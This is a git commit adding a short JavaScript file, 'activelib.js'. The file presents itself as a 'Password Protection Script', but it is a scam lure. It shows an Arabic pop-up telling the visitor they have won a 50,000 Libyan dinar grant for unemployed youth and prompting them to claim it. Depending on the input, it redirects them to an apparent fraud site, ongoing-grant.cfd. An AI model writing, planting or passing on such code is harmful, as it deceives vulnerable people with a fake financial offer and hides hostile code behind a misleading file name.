f672b49e450f3fcb5fb3b76a3ecb0e7eccd9f8a2
The-ongoing <preciousadaowo4@gmail.com>
2026-04-17 17:15:11 +0100

    Create activelib.js

---
+++ activelib.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'سحب النقود'
+password = prompt(
+  'مبروك! أنت مؤهل للحصول على منحة المهارات والحلول بقيمة 50,000 دينار ليبي للشباب العاطلين عن العمل. يرجى الضغط على OK للاستلام فورًا.',
+  'سحب النقود'
+);
+if (password != 'سحب النقود') {
+  location.href = 'https://ongoing-grant.cfd/50000-Skills-Solution.html';
+  }
